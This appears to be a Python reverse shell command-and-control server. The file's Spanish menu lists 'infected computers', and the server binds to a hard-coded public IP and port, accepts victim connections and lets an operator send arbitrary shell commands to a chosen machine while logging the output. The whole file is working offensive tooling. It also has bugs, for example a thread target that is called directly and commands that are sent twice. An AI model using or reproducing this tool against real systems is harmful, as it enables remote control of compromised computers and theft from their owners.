from os import mkdir, system, path
import socket
from threading import Thread
from colorama import init, Fore, Style
from datetime import date, datetime
import platform

SERVER_HOST = "138.197.77.162"
SERVER_PORT = 8012
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

init()

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)

if platform.system() == 'Windows': 
    clear = 'cls'
else: 
    clear = 'clear'
in_menu = True
clients = []

def add_client(connection, addr):
    clients.append({ "conn": connection, "cwd": connection.recv(BUFFER_SIZE).decode(), "addr": addr, "user": connection.recv(BUFFER_SIZE).decode() })
    if in_menu: update_screen()

def start():
    while True:
        client_socket, client_address = s.accept()
        Thread(target = add_client(client_socket, client_address)).start()
    
def log_data(head, msg):
    d = date.today()
    t = datetime.now()
    f = open('logs/{0}-{1}-{2}.log'.format(date.today().year, date.today().month, date.today().day), "a+")
    f.write("[{0}] [{0}/{1}/{2}-{3}:{4}:{5}] {6}.\n".format(head, d.day, d.month, d.year, t.hour, t.minute, t.second, msg))
    f.close

def connect(function):
    global in_menu
    try:
        clients[function-1]["conn"].send("test".encode())
        condition = True
    except:
        condition = False
    if condition:
        log_data("CONNECTED", "Connected to {0} {1}.\n".format(clients[function-1]["user"], clients[function-1]["addr"]))
        if not path.exists('logs'):
            mkdir('logs')
        if not path.exists('logs/{0}-{1}-{2}.log'.format(date.today().year, date.today().month, date.today().day)):
            log_data("CONNECTED", "Connected to {0} {1}".format(clients[function-1]["user"], clients[function-1]["addr"]))
        in_menu = False
        client_socket = clients[function-1]["conn"]
        cwd = clients[function-1]["cwd"]
        system(clear)
        while True:
            try:
                command = input(f"{cwd} #> ")
                log_data("COMMAND", "[{0}] {1} {2}".format(clients[function-1]["user"], clients[function-1]["addr"], command))
                if not command.strip():
                    continue
                client_socket.send(command.encode())
                if command.lower() == "exit":
                    break
                elif command.lower() == clear:
                    system(clear)
                    continue
                elif command.lower() == "reverseshell alert " and command.strip()[3] and command.strip()[2]:
                    continue
                client_socket.send(command.encode())
                output = client_socket.recv(BUFFER_SIZE).decode()
                print("output:", output)
                results, cwd = output.split(SEPARATOR)
                log_data("OUTPUT", "[{0}] {1} {2}".format(clients[function-1]["user"], clients[function-1]["addr"], results))
                print(results)
            except:
                log_data("ERROR", "[{0}] {1} ¡Ha ocurrido un error!".format(clients[function-1]["user"], clients[function-1]["addr"]))
                print("¡Ha ocurrido un error!")
                break
        in_menu = True
        update_screen()
    else:
        log_data("ERROR", "Failed Connection to [{0}] {1}".format(clients[function-1]["user"], clients[function-1]["addr"]))
        update_screen()

def update_screen():
    system(clear)
    print(Fore.CYAN +  "\n   ______                                     ______ _           _ _  \n  (_____ \                                   / _____) |         | | | \n   _____) )_____ _   _ _____  ____ ___ _____( (____ | |__  _____| | | \n  |  __  /| ___ | | | | ___ |/ ___)___) ___ |\____ \|  _ \| ___ | | | \n  | |  \ \| ____|\ V /| ____| |  |___ | ____|_____) ) | | | ____| | | \n  |_|   |_|_____) \_/ |_____)_|  (___/|_____|______/|_| |_|_____)\_)_)\n  " + Style.RESET_ALL)
    print("  Computadores Infectados :\n")
    for i in range(0, len(clients)):
        try:
            clients[i]["conn"].send("test".encode())
            condition = True
        except:
            condition = False
        if condition:
            print("        {1} : {0} {2}".format(clients[i]["user"], i + 1, clients[i]["addr"]))


Thread(target = start).start()

while True:
    update_screen()
    function = input("\n  ReverseShell #> ")
    log_data("ReverseShell", function)
    if function.startswith("connect ") and function.split()[1]: 
        try:
            connect(int(function.split()[1]))
        except:
            False
